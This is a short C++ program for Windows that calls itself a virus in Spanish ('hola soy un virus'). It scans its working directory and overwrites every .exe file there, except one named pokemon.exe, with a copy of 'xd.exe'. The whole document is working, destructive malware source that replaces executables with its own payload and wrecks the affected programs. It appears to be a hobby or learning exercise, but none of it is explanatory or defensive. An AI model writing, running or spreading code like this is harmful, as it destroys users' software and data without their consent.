#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <filesystem>


using namespace std;
bool exel(const filesystem::path&);
int main(){
    cout<<"hola soy un virus\n";
    string nombrearchivo;
    filesystem::path ubicacion= filesystem::current_path();
    filesystem::file_status tipo;
    for(const auto& entry : filesystem::directory_iterator(ubicacion)){
        tipo=entry.status();
        
        if(!(filesystem::is_directory(tipo)) && exel(entry.path())&& entry.path().filename() != "pokemon.exe"){
        
        CopyFile("xd.exe",entry.path().string().c_str(),false);
        }
    }
    system ("pause");
    return 0;
}
bool exel(const filesystem::path& archivo){
    return archivo.extension().string()==".exe"; 
}